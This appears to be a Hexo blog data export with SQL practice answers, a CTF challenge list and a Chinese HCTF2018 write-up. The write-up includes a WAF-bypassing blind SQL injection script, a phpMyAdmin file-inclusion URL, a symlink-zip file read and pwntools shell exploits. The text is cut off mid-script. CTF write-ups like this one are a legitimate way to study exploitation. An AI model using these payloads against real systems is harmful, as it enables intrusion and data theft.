src=\"https://md.byr.moe/uploads/upload_f428d7b7e4c893fa8982e6b8ff24ac43.png\" alt></p>\n<h2 id=\"Create-Table-‘Sales’\"><a href=\"#Create-Table-‘Sales’\" class=\"headerlink\" title=\"Create Table ‘Sales’\"></a>Create Table ‘Sales’</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `sales` (</span><br><span class=\"line\">  `id` int(11) NOT NULL,</span><br><span class=\"line\">  `Sales_Date` date NOT NULL,</span><br><span class=\"line\">  `Customer_ID` varchar(50) NOT NULL,</span><br><span class=\"line\">  `Item` varchar(50) NOT NULL,</span><br><span class=\"line\">  `Amount` int(11) NOT NULL</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE `sales`</span><br><span class=\"line\">  ADD PRIMARY KEY (`id`),</span><br><span class=\"line\">  ADD UNIQUE KEY `id` (`id`);</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE `sales`</span><br><span class=\"line\">  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;</span><br><span class=\"line\">COMMIT;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_e92b631726f33f96c7fd01f47ea7a2a4.png\" alt></p>\n<h2 id=\"Init-Data\"><a href=\"#Init-Data\" class=\"headerlink\" title=\"Init Data\"></a>Init Data</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSERT INTO `sales` (`id`, `Sales_Date`, `Customer_ID`, `Item`, `Amount`) VALUES</span><br><span class=\"line\">(1, &apos;2018-08-01&apos;, &apos;AAA&apos;, &apos;Apple&apos;, 600),</span><br><span class=\"line\">(2, &apos;2018-08-08&apos;, &apos;AAA&apos;, &apos;Nike&apos;, 500),</span><br><span class=\"line\">(3, &apos;2018-08-10&apos;, &apos;AAA&apos;, &apos;Kindle&apos;, 900),</span><br><span class=\"line\">(4, &apos;2018-07-22&apos;, &apos;BBB&apos;, &apos;Cola&apos;, 400),</span><br><span class=\"line\">(5, &apos;2018-09-12&apos;, &apos;BBB&apos;, &apos;LEGO&apos;, 240),</span><br><span class=\"line\">(6, &apos;2018-09-13&apos;, &apos;BBB&apos;, &apos;PS4&apos;, 2000),</span><br><span class=\"line\">(7, &apos;2018-10-15&apos;, &apos;CCC&apos;, &apos;SWITCH&apos;, 2200),</span><br><span class=\"line\">(8, &apos;2018-08-08&apos;, &apos;AAA&apos;, &apos;Adidas&apos;, 5000),</span><br><span class=\"line\">(9, &apos;2018-08-09&apos;, &apos;AAA&apos;, &apos;Douban&apos;, 50),</span><br><span class=\"line\">(10, &apos;2018-07-23&apos;, &apos;BBB&apos;, &apos;Paper&apos;, 800),</span><br><span class=\"line\">(11, &apos;2018-08-13&apos;, &apos;BBB&apos;, &apos;Phone&apos;, 851),</span><br><span class=\"line\">(12, &apos;2018-07-12&apos;, &apos;AAA&apos;, &apos;Apple&apos;, 5600),</span><br><span class=\"line\">(13, &apos;2018-08-11&apos;, &apos;BBB&apos;, &apos;Cola&apos;, 2300);</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_4dbfb98b1d2fd9618b93474b31e8c6bc.png\" alt></p>\n<h2 id=\"Query-1\"><a href=\"#Query-1\" class=\"headerlink\" title=\"Query_1\"></a>Query_1</h2><p>We need to calculate the amount for each user and month, so we will use <code>group by sales_month, customer_id</code>. And then we can add a condition to make the total_amount between 2000 and 10000. <code>Month(Date)</code> can calculate the month of the date. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT month(Sales_Date) as sales_month, Customer_ID, sum(amount) as total_amount </span><br><span class=\"line\">FROM `sales` </span><br><span class=\"line\">GROUP BY </span><br><span class=\"line\">    customer_id, sales_month </span><br><span class=\"line\">having </span><br><span class=\"line\">    total_amount BETWEEN 2000 and 10000;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Query-2\"><a href=\"#Query-2\" class=\"headerlink\" title=\"Query_2\"></a>Query_2</h2><p>这个好难，感觉leetcode的hard难度都不止。。我可以做到这样列出来，然后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT month(Sales_Date) as sales_month, Customer_ID, item</span><br><span class=\"line\">from sales as s1 where </span><br><span class=\"line\">\t(SELECT count(1) from sales as s2 where </span><br><span class=\"line\">     month(s1.Sales_Date)=month(s2.Sales_Date) </span><br><span class=\"line\">     and s1.Customer_ID=s2.Customer_ID </span><br><span class=\"line\">     and s1.amount &gt; s2.Amount) &lt; 3 </span><br><span class=\"line\">order by sales_month asc, Customer_ID, amount desc;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_ac6188bcf47029f1bfc299f69332d3ea.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT month(Sales_Date) as sales_month, Customer_ID, GROUP_CONCAT(item SEPARATOR &apos;|&apos;) as top3</span><br><span class=\"line\">from sales as s1 where </span><br><span class=\"line\">    (SELECT count(1) from sales as s2 where </span><br><span class=\"line\">     month(s1.Sales_Date)=month(s2.Sales_Date) </span><br><span class=\"line\">     and s1.Customer_ID=s2.Customer_ID </span><br><span class=\"line\">     and s1.amount &gt; s2.Amount) &lt; 3 </span><br><span class=\"line\">group by sales_month, Customer_ID</span><br><span class=\"line\">order by sales_month asc, Customer_ID, amount desc</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_bed54b471e4dd2071f08c9fed9ad2319.png\" alt></p>\n<p>First of all, we should know how to make multiple rows to one row, we can use <code>GROUP_CONCAT</code>.<br>Then we need to process the date group by group, we use a sub query and the condition <code>&lt; 3</code> .<br>And I think get the order right is also important. The first is sales_month, then customer_id, and finally amount.</p>\n<h2 id=\"Query-3\"><a href=\"#Query-3\" class=\"headerlink\" title=\"Query_3\"></a>Query_3</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with t1 as (</span><br><span class=\"line\">select Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=7 group by Item</span><br><span class=\"line\">), t2 as (</span><br><span class=\"line\">select Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=8 group by Item</span><br><span class=\"line\">), p as ( SELECT t1.item as item, -((case when t2.item is null then 0 else t2.total end)-t1.total) as MoM_Decrease FROM t1</span><br><span class=\"line\">\t\tLEFT JOIN t2 ON t1.item = t2.item</span><br><span class=\"line\">\tUNION</span><br><span class=\"line\">\t(SELECT t2.item as item, -(t2.total-(case when t1.item is null then 0 else t1.total end)) as MoM_Decrease FROM t1</span><br><span class=\"line\">\t\tRIGHT JOIN t2 ON t1.item = t2.item)</span><br><span class=\"line\">),q as (select * from p </span><br><span class=\"line\">\twhere p.MoM_Decrease &gt;= 0</span><br><span class=\"line\">\torder by p.MoM_Decrease desc limit 10)</span><br><span class=\"line\">select </span><br><span class=\"line\">\t(@rowNum:=@rowNum+1) Rank_,q.*</span><br><span class=\"line\">from </span><br><span class=\"line\">\tq,(select (@rowNum :=0)) k;</span><br></pre></td></tr></table></figure>\n<p>Pre-query t1 and t2 query for the purchase log of July and August. And query p is calculate for the MoM_Decrease for each item, we use the FULL OUTER JOIN here. Then we can add the rank for the result.</p>\n<h2 id=\"Query-4\"><a href=\"#Query-4\" class=\"headerlink\" title=\"Query_4\"></a>Query_4</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with t as (</span><br><span class=\"line\">select Customer_ID, Sales_Date from sales where year(Sales_Date)=2018 and month(Sales_Date)=8</span><br><span class=\"line\">)</span><br><span class=\"line\">select a.customer_ID</span><br><span class=\"line\"> \tfrom t as a, t as b, t as c</span><br><span class=\"line\">   where a.sales_date+1=b.sales_date and a.sales_date+2=c.sales_date</span><br><span class=\"line\"> \tand a.customer_id = b.customer_id and a.customer_id = c.customer_id GROUP BY Customer_ID</span><br></pre></td></tr></table></figure>\n<p>First we use pre-query to find the rows in 2018/08. After that we can use a simple query to find the customers who have purchased in at least three consecutive.</p>\n<p>在mysql的规范中，并不包含连续性的相关方法，所以按照通常来说，我们应该使用其他方式查询该题所需的数据【例如一些脚本语言，可以使用更方便快捷的算法】。</p>"},{"title":"近期比赛题目列表","date":"2019-03-25T20:00:34.000Z","_content":"\n题目列表，感兴趣的同学可以来我的淘宝店联系~\n\n[西塞尔的淘宝店](https://shop149934299.taobao.com/index.htm)\n\n<!-- more -->\n\n## DDCTF2019\n\n- 待更新\n\n## TCTF2019 quals \n- web\n\t- ghost pepper: java karaf jetty\n\t- Wallbreaker Easy: php disable_function php-imagick rce background\n- crypto\n\t- babyrsa: rsa sage\n\t- zer0lfsr: 流密码 z3-solver \n\t- babysponge: keccak sha3\n\n## Dorahacks2018区块链专题赛\n- BlockChain\n\t- 四个关于智能合约的题目\n","source":"_posts/ctf-question-list.md","raw":"---\ntitle: 近期比赛题目列表\ndate: 2019-03-26 04:00:34\ntags:\n- CTF\n- writeup\n---\n\n题目列表，感兴趣的同学可以来我的淘宝店联系~\n\n[西塞尔的淘宝店](https://shop149934299.taobao.com/index.htm)\n\n<!-- more -->\n\n## DDCTF2019\n\n- 待更新\n\n## TCTF2019 quals \n- web\n\t- ghost pepper: java karaf jetty\n\t- Wallbreaker Easy: php disable_function php-imagick rce background\n- crypto\n\t- babyrsa: rsa sage\n\t- zer0lfsr: 流密码 z3-solver \n\t- babysponge: keccak sha3\n\n## Dorahacks2018区块链专题赛\n- BlockChain\n\t- 四个关于智能合约的题目\n","slug":"ctf-question-list","published":1,"updated":"2020-02-18T14:02:19.100Z","_id":"ck6rlh7tt001a21vwplr7wsgs","comments":1,"layout":"post","photos":[],"link":"","content":"<p>题目列表，感兴趣的同学可以来我的淘宝店联系~</p>\n<p><a href=\"https://shop149934299.taobao.com/index.htm\" target=\"_blank\" rel=\"noopener\">西塞尔的淘宝店</a></p>\n<a id=\"more\"></a>\n<h2 id=\"DDCTF2019\"><a href=\"#DDCTF2019\" class=\"headerlink\" title=\"DDCTF2019\"></a>DDCTF2019</h2><ul>\n<li>待更新</li>\n</ul>\n<h2 id=\"TCTF2019-quals\"><a href=\"#TCTF2019-quals\" class=\"headerlink\" title=\"TCTF2019 quals\"></a>TCTF2019 quals</h2><ul>\n<li>web<ul>\n<li>ghost pepper: java karaf jetty</li>\n<li>Wallbreaker Easy: php disable_function php-imagick rce background</li>\n</ul>\n</li>\n<li>crypto<ul>\n<li>babyrsa: rsa sage</li>\n<li>zer0lfsr: 流密码 z3-solver </li>\n<li>babysponge: keccak sha3</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Dorahacks2018区块链专题赛\"><a href=\"#Dorahacks2018区块链专题赛\" class=\"headerlink\" title=\"Dorahacks2018区块链专题赛\"></a>Dorahacks2018区块链专题赛</h2><ul>\n<li>BlockChain<ul>\n<li>四个关于智能合约的题目</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>题目列表，感兴趣的同学可以来我的淘宝店联系~</p>\n<p><a href=\"https://shop149934299.taobao.com/index.htm\" target=\"_blank\" rel=\"noopener\">西塞尔的淘宝店</a></p>","more":"<h2 id=\"DDCTF2019\"><a href=\"#DDCTF2019\" class=\"headerlink\" title=\"DDCTF2019\"></a>DDCTF2019</h2><ul>\n<li>待更新</li>\n</ul>\n<h2 id=\"TCTF2019-quals\"><a href=\"#TCTF2019-quals\" class=\"headerlink\" title=\"TCTF2019 quals\"></a>TCTF2019 quals</h2><ul>\n<li>web<ul>\n<li>ghost pepper: java karaf jetty</li>\n<li>Wallbreaker Easy: php disable_function php-imagick rce background</li>\n</ul>\n</li>\n<li>crypto<ul>\n<li>babyrsa: rsa sage</li>\n<li>zer0lfsr: 流密码 z3-solver </li>\n<li>babysponge: keccak sha3</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Dorahacks2018区块链专题赛\"><a href=\"#Dorahacks2018区块链专题赛\" class=\"headerlink\" title=\"Dorahacks2018区块链专题赛\"></a>Dorahacks2018区块链专题赛</h2><ul>\n<li>BlockChain<ul>\n<li>四个关于智能合约的题目</li>\n</ul>\n</li>\n</ul>"},{"title":"【writeup】hctf2018","date":"2018-11-21T06:14:30.000Z","_content":"\n来自杭电师傅的HCTF，比赛很有趣！本次比赛线上赛我们好像是第四还是第五，线下赛是Henryzhao，姚老板和禹越去的，拿了线下赛第一吼吼~\n\n<!-- more -->\n\n## web\n\n### warmup\n\nphpmyadmin4.8.1的文件包含漏洞，截取和转义的问题。\n\n```\nhttp://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../ffffllllaaaagggg\n```\n\n### kzone\n\n扫描目录发现/www.zip有源码，下载之，开始审计\n同时搜到了题目源码的出处，来自一个钓鱼网站模板；也搜到了一篇针对这个模板进行渗透的文章 https://bbs.ichunqiu.com/article-1518-1.html\n\n/include/member.php存在注入，但是需要绕过safe.php的waf\n在member.php中发现了json_decode\n可以解析\\u0020这样的unicode编码\n所以所有被waf检测到的字符全部使用此编码绕过\n首先注出了后台账号密码 尝试登录但后台没有东西 于是猜测flag在数据库中 继续用脚本注入得到flag\n注入的时候还碰到了大小写不敏感的问题 使用binary可以解决\n```\nimport requests\nimport time\nurl = \"http://kzone.2018.hctf.io/admin/login.php\"\nflag = ''\ndic = \"0123456789abcdefghijklmnopqrstuvwxyz{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+|,-./:;<=>?@\"\nfor x in range(1,50):\n    for i in dic:\n        startTime = time.time()\n        #poc = \"'\\u006fr\\u0020su\\u0062str(passwo\\u0072d,{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,chr(i))\n        #admin BE933CBA048A9727A2D2E9E08F5ED046\n        #poc = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.tables\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i)\n        #F1444g\n        #poc = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i)\n        #F1a9\n        poc = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i)\n        headers = {\"Cookie\":'islogin=1; login_data={\\\"admin_user\\\":\\\"'+poc+'\\\"}'}\n        r = requests.get(url,headers=headers)\n        if time.time() - startTime > 5:\n            flag += i\n            print flag\n            break\n```\n\n### admin\n这简直是我做ctf以来最神奇的一次经历\n先是在fuzz过程中莫名其妙的拿到了flag \n这一点其实想看看出题大佬怎么说的，感觉是后端数据库刷新的时候验证用户会出现问题。因为后来又复现成功了一次，具体操作是：在整点的时候注册admin账户提示已存在->再注册自己的账户提示注册成功后直接弹出flag，如下图...\n\n![](http://cur5s-1.oss-cn-beijing.aliyuncs.com/18-11-12/75374228.jpg)\n\n根据flag的内容知道考点是unicode cheat...队友研究了一波\n注册 ᴬdmin，登录后修改密码，数据库会将真实admin的密码修改掉，然后再登录admin就可以了。\n而后队友下午再次尝试复现的时候发现题目竟然在修改密码的页面给了源码...\n\n然后我们就成了 获得flag->根据flag获知解题方法->发现题目竟然给出了源码\nctf史上第一支倒着做题的队伍（手动捂脸\n坐等官方大佬的wp解释一下非预期解的问题，估计有不少做出这道题的队伍是先拿到了flag\n\n\n### hideandseek\n\n这题还是有意思，做起来每一步都很有道理，我们队好几个人一起做出来这个题。\n\n1. 登录进去后，提示上传一个zip文件，发现他会cat这个文件，想到以前见过的上传硬连接。\n```\nln -s /etc/passwd ./templink\nzip --symlink -r lala.zip ./templink\n```\n上传即可\n2. 信息收集\n权限很低，很多都读不了，但还是可以看看/proc下面的各种内容。\n- /proc/self/environ，找到web服务目录。\n- /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 是运行的文件\n- /app/hard_t0_guess_n9f5a95b5ku9fg/flag.py 不能直接读，尴尬\n- /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html 读模板\n3. cookie伪造\n看到key是随机数生成的，种子是uuid，uuid.getnode()是mac地址，可以\n```\ncat /sys/class/net/eth0/address\n```\n伪造一个username=admin的cookie就好啦。\n\n### game\n\n这题目也很有趣，可以随意注册，登陆以后可以看到所有注册了的人的列表。看其他人注册了好多，思考为什么这么做。各种注入都试了，没有注入点。\n看到了order=score，试着order=id，name都可以，又试着order=password，发现也行，震惊！\n```\nimport requests\nimport string\nimport os, random\n\nguess_list = string.printable\n\nold_password = 'dsA8&&!@#$%^&D1NgY1as3DjA'\n\ndef encode(length, op):\n    a = ''.join(random.sample(string.ascii_letters + string.digits, length/2))\n    a += (op+''.join(random.sample(string.ascii_letters + string.digits, 2))).encode('base64')[:-1]\n    a += ''.join(random.sample(string.ascii_letters + string.digits, length/2))\n    return a\n    \n\nfor op in guess_list:\n    data = {\n\t    'username': 'TuTuXiXiHHH'+ encode(len(old_password),op),\n\t    'password': old_password + op,\n\t    'sex':'1',\n\t    'submit':'submit',\n    }\n\n    requests.post(\"http://game.2018.hctf.io/web2/action.php?action=reg\",data = data)\n    print op, data\n```\n注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。\n\n\n## pwn\n\n### the_end\n程序本身的功能为5次任意地址（用户输入）的1字节写随后调用exit()函数，且提供了sleep@libc的地址。通过单步跟踪exit()函数可以发现，程序在_dl_fini()函数中会\n```asm\ncall   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 <_rtld_global+3848>\n```\n因此，只要将0x7ffff7ffdf48 <_rtld_global+3848>处修改为one_gadget的地址即可拿到shell，刚好需要修改5个字节。\n由于程序关闭了stdout，拿到shell后，使用\n```bash\nexec /bin/sh 1>&0\n```\n执行sh并重定向标准输出流到标准输入流，即可与shell正常交互。\n```python\n# coding=utf-8\nfrom pwn import *\n\ndef pwn():\n    BIN_PATH = './the_end'\n    DEBUG = 1\n    local = 1\n    if DEBUG == 1:\n        if local == 1:\n            p = process(BIN_PATH)\n        else:\n            p = process(BIN_PATH, env={'LD_PRELOAD': './libc.so.6'})\n        elf = ELF(BIN_PATH)\n        context.log_level = 'debug'\n        context.terminal = ['tmux', 'split', '-h']\n        if context.arch == 'amd64':\n            if local == 1:\n                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n            else:\n                libc = ELF('./libc.so.6')\n        else:\n            libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n    else:\n        p = remote('150.109.44.250', 20002)\n        p.recvuntil('Input your token:')\n        p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')\n        elf = ELF(BIN_PATH)\n        libc = ELF('./libc.so.6')\n        context.log_level = 'debug'\n\n    if DEBUG == 1:\n        gdb.attach(p, gdbscript='b *0x0000555555554964')\n\n    p.recvuntil('here is a gift ')\n    recv = p.recvuntil(',', drop=True)\n    libc.address = int(recv, 16) - libc.symbols['sleep']\n    print hex(libc.address)\n    one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]\n    p.recvuntil('luck ;)\\n')\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000)))\n    p.send(p64(libc.address + one_gadget[2])[0])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 1))\n    p.send(p64(libc.address + one_gadget[2])[1])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 2))\n    p.send(p64(libc.address + one_gadget[2])[2])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 3))\n    p.send(p64(libc.address + one_gadget[2])[3])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 4))\n    p.send(p64(libc.address + one_gadget[2])[4])\n    # exec /bin/sh 1>&0\n    p.interactive()\n    p.close()\n\n\nif __name__ == '__main__':\n    pwn()\n\n```\nflag:```hctf{999402245e53bc5f0154c2a931bdc52ca3f6ee34e017f19c09a70e93c8fd4ffa}```\n\n### babyprintf_ver2\n\n该程序通过read向bss上的全局变量输入数据，其后是stdout指针，可以进行覆盖篡改。由于知道bss的地址，首先将stdout指针的值修改为bss的地址，并在bss上布置虚假的stdout的FILE结构体，vtable地址由于程序本身带有检测，会自动填入。通过设置FILE结构体中的缓冲区指针，泄漏libc地址和修改__malloc_hook的值为one_gadget。最后通过触发printf_chk的报错使得程序调用malloc函数进而getshell。\n```python\n# coding=utf-8\nfrom pwn import *\n\ndef pwn():\n    BIN_PATH = './babyprintf_ver2'\n    DEBUG = 0\n    context.arch = 'amd64'\n    if DEBUG == 1:\n        p = process(BIN_PATH)\n        elf = ELF(BIN_PATH)\n        context.log_level = 'debug'\n        context.terminal = ['tmux', 'split', '-h']\n        if context.arch == 'amd64':\n            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n        else:\n            libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n    else:\n        p = remote('150.109.44.250', 20005)\n        elf = ELF(BIN_PATH)\n        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n        p.recvuntil('Input your token:')\n        p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')\n        context.log_level = 'debug'\n\n\n    p.recvuntil('buffer location to')\n    recv = p.recvuntil('\\n', drop=True)\n    bss_address = int(recv, 16)\n    p.recvuntil('Have fun!\\n')\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3\n    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d)\n    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n\n    p.sendline(payload)\n    p.recvuntil('permitted!\\n')\n    p.sendline('a' * 8)\n    recv = p.recv(8)\n    libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000)\n    print hex(libc.address)\n\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)\n    payload += p64(bss_address + 0x200) * 7\n    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n\n    p.sendline(payload)\n\n    malloc_hook_addr = libc.symbols['__malloc_hook']\n\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)\n    payload += p64(bss_address + 0x200) * 6\n    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n    p.sendline(payload)\n\n    p.sendline(p64(libc.address + 0x10a38c)) # one_gadget\n\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)\n    payload += p64(bss_address + 0x200) * 7\n    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n    p.sendline(payload)\n    sleep(0.5)\n    p.sendline('%49$p')\n    \n    p.interactive()\n    p.close()\n\n\nif __name__ == '__main__':\n    pwn()\n\n```\nflag:```hctf{72717218d270a992e1415bb825366e79d254ec232022b5fc45297ef7ae5c7ea6}```\n## re\n\n### LuckStar\n这题有不少反调试.\n首先在TlsCallback_0里获取了一堆反调试常用函数地址:\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ylwxkhkj31iw0abjru.jpg)\n排查几款调试器，并解混淆的main函数\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ymtx7s7j315e0n4js0.jpg)\n在之前获取的CheckRemoteDebuggerPresent函数下断点\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn2l65cj30nw06h3yw.jpg)\n发现在调用main之前被调用，用于重设srand的种子,应为hctf。\n接着进入main函数：\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn9qzczj30t10lp76f.jpg)\nmain函数里，my_base64函数被混淆，只用用seed=hctf才能正确还原。\nmy_base64如下：\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ynimy3ij30th0f9q3k.jpg)\n在my_base64里面对输入的字符进行变异的base64处理，不过把大小写互换，然后把加密的结果做一段xor处理。return后与main函数里预存储的v17做比较，相同则得到flag。\n由于仅作xor处理，这里我动调时把预存储的v17数据放在xor处理执行，得到base64(flag),\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypprkjaj30gr022t99.jpg)\n做大小写转换后，解base64得flag:\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypyyscwj305x00xwec.jpg)\n\n### Seven\n\n驱动程序逆向，程序关键逻辑很少，需要我们走一个类似7字的迷宫，迷宫图直接就能看到，四个十六进制码0x11,0x1F,0x1E,0x20分别控制人物的上下左右移动，o代表当前位置，\\*代表不可行位置，.代表可行位置。整个程序找不到输入，但是能发现一个12字节的结构体，查阅资料发现是KEYBOARD_INPUT_DATA结构，第二个USHORT成员MAKECODE是键盘的扫描码，搜索扫描码，得到四个十六进制码分别对应wsad。\nflag:```hctf{ddddddddddddddssaasasasasasasasasas}```\n\n### PolishDuck\n\nBadusb的题目，同种类型的题目出现了很多次，印象里最先看到是在pwnhub-血月归来一题，后来是HITB-hex一题，到SUCTF2018的SecretGarden，XCTF2018Final，然后是HCTF2018的PolishDuck，做法和pwnhub上面的一模一样，都是打开notepad.exe，然后输入一串计算数字。我们只要整理出数字串，计算出结果，hex再hex解码即可得到flag。\nflag:```hctf{P0l1sh_Duck_Tast3s_D3l1ci0us_D0_U_Th1nk?}```\n\n## misc\n\n### freq game\n这个题题目大概就是把4个字符的ascii码作为参数进行正弦变换然后加起来的结果，看完代码发现最后乘的rge并没有卵用所以可以消掉，就变成了y/7 = sin() + sin() + sin() + sin()的样子，所以我找了y/7 > 3的y作为约束条件，因为此时对应的四个sin()值必须都要大于y/7-3。本来是想把这个作为约束条件缩小范围再爆破的，结果用这个条件基本上就能把答案约束出来了，中间好像只有一组数是需要进一步爆破的，但剩的也不多所以很容易就获得了结果。代码如下：\n```python\nfrom pwn import *\nimport numpy as np\n\ndef show(mylist,testlist):\n    for i in range(len(testlist)):\n        if mylist[testlist[i][0]] < testlist[i][1] - 3.0 :\n            return False\n    return True\n\np = 